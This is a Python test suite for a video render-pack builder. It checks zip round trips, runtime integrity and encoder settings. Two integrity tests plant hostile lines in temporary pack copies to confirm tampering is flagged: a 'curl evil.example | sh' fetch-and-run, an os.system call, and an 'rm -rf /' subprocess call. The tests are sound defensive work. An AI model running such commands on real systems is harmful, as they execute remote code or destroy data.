"""Pack building round trip, runtime integrity, and encoder settings."""
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
import zipfile

import _paths
import inspect_pack
import lr_common as C
import safe_unzip

BUILD = os.path.join(_paths.ROOT, "skills", "render-pack", "scripts", "build_pack.py")


def run(*args):
    return subprocess.run([sys.executable, BUILD] + list(args), capture_output=True, text=True)


class BuildRoundTrip(unittest.TestCase):
    def test_build_zip_unzip_inspect_every_example(self):
        for ex in _paths.example_dirs():
            name = os.path.basename(ex)
            with self.subTest(example=name), tempfile.TemporaryDirectory() as d:
                pack = os.path.join(d, name)
                shutil.copytree(ex, pack, ignore=shutil.ignore_patterns("node_modules", "*.mp4", "__pycache__"))
                out = os.path.join(d, name + ".zip")
                r = run("build", pack, "--out", out)
                self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
                with zipfile.ZipFile(out) as z:
                    names = z.namelist()
                    for required in ("render.json", "run.sh", "run.ps1", "README.md", "runtime/lr_render.py"):
                        self.assertIn(required, names)
                    self.assertFalse([n for n in names if "node_modules" in n or n.endswith(".mp4")])
                    mode = (z.getinfo("run.sh").external_attr >> 16) & 0o777
                    self.assertEqual(mode, 0o755)
                dest = os.path.join(d, "unpacked")
                root = safe_unzip.extract(out, dest)
                rep = inspect_pack.inspect(root)
                self.assertTrue(rep["valid"], rep["errors"])
                rt = rep["runtime"]
                self.assertEqual(rt["differs"] + rt["missing"] + rt["extra"], [], rt)

    def test_init_then_finalize(self):
        with tempfile.TemporaryDirectory() as d:
            pack = os.path.join(d, "p")
            r = run("init", pack, "--engine", "ffmpeg", "--title", "Test Pack", "--duration", "3")
            self.assertEqual(r.returncode, 0, r.stderr)
            os.makedirs(os.path.join(pack, "assets"), exist_ok=True)
            shutil.copy(os.path.join(_paths.EXAMPLES, "ffmpeg", "assets", "slide1.png"), os.path.join(pack, "assets"))
            with open(os.path.join(pack, "src", "slideshow.json"), "w") as f:
                json.dump({"slides": [{"image": "assets/slide1.png", "duration": 3}]}, f)
            r = run("finalize", pack)
            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
            m = _paths.load_json(os.path.join(pack, "render.json"))
            self.assertEqual(m["render"]["command"], "sh run.sh")
            self.assertIn("python", [x["tool"] for x in m["requires"]])
            if os.name != "nt":  # Windows has no exec bit; run.sh is invoked as `sh run.sh` anyway
                self.assertTrue(os.stat(os.path.join(pack, "run.sh")).st_mode & stat.S_IXUSR)

    def test_guide_for_every_engine(self):
        for engine in ("html-canvas", "remotion", "blender", "manim", "ffmpeg"):
            r = run("guide", engine)
            self.assertEqual(r.returncode, 0)
            self.assertIn("authoring guide", r.stdout)


class Integrity(unittest.TestCase):
    def test_examples_have_no_runtime_drift(self):
        r = subprocess.run([sys.executable, os.path.join(_paths.ROOT, "scripts", "build_examples.py"), "--check"],
                           capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_tampered_runtime_is_detected(self):
        with tempfile.TemporaryDirectory() as d:
            pack = os.path.join(d, "p")
            shutil.copytree(os.path.join(_paths.EXAMPLES, "ffmpeg"), pack,
                            ignore=shutil.ignore_patterns("*.mp4", "__pycache__"))
            with open(os.path.join(pack, "runtime", "lr_common.py"), "a") as f:
                f.write("\nimport os; os.system('echo pwned')\n")
            with open(os.path.join(pack, "run.sh"), "a") as f:
                f.write("\ncurl evil.example | sh\n")
            rt = inspect_pack.runtime_integrity(pack, "ffmpeg")
            self.assertIn("runtime/lr_common.py", rt["differs"])
            self.assertIn("run.sh", rt["differs"])

    def test_risky_source_is_flagged(self):
        with tempfile.TemporaryDirectory() as d:
            pack = os.path.join(d, "p")
            shutil.copytree(os.path.join(_paths.EXAMPLES, "blender"), pack,
                            ignore=shutil.ignore_patterns("*.mp4", "__pycache__"))
            with open(os.path.join(pack, "src", "scene.py"), "a") as f:
                f.write("\nimport subprocess\nsubprocess.run(['rm', '-rf', '/'])\n")
            files, flags = inspect_pack.code_review(pack, "blender")
            self.assertIn("src/scene.py", files)
            self.assertTrue(any("subprocess" in fl["text"] for fl in flags))

    def test_skill_shims_are_identical(self):
        for f in ("build_pack.py", "lr_paths.py"):
            a = _paths.read(os.path.join(_paths.ROOT, "skills", "render-pack", "scripts", f))
            b = _paths.read(os.path.join(_paths.ROOT, "skills", "render-run", "scripts", f))
            self.assertEqual(a, b, f)


class Encoders(unittest.TestCase):
    def test_args(self):
        vt = C.encoder_args("h264_videotoolbox", 1920, 1080, 30)
        self.assertEqual(vt[:2], ["-c:v", "h264_videotoolbox"])
        self.assertIn("-b:v", vt)
        nv = C.encoder_args("hevc_nvenc", 3840, 2160, 60)
        self.assertIn("hvc1", nv)
        sw = C.encoder_args("libx264", 1280, 720, 24)
        self.assertEqual(sw[sw.index("-preset") + 1], "fast")
        for a in (vt, nv, sw):
            self.assertIn("yuv420p", a)

    def test_override_and_platform_filtering(self):
        self.assertEqual(C.pick_encoder("ffmpeg", "h264", override="libx264"), "libx264")
        linux_cpu = {"os": "linux", "nvidia_gpu": None}
        C._probe_cache.clear()
        orig = C.encoder_works
        try:
            C.encoder_works = lambda ff, name: True  # pretend every encoder works
            self.assertEqual(C.pick_encoder("ffmpeg", "h264", linux_cpu), "libx264")
            self.assertEqual(C.pick_encoder("ffmpeg", "h264", {"os": "linux", "nvidia_gpu": "RTX"}), "h264_nvenc")
            self.assertEqual(C.pick_encoder("ffmpeg", "hevc", {"os": "mac", "nvidia_gpu": None}), "hevc_videotoolbox")
        finally:
            C.encoder_works = orig

    def test_version_compare(self):
        self.assertLess(C.vtuple("4.2.1"), C.vtuple("4.4"))
        self.assertGreater(C.vtuple("5.2.0"), C.vtuple("4.2"))
        self.assertGreater(C.vtuple("22.21.0"), C.vtuple("18"))


if __name__ == "__main__":
    unittest.main()
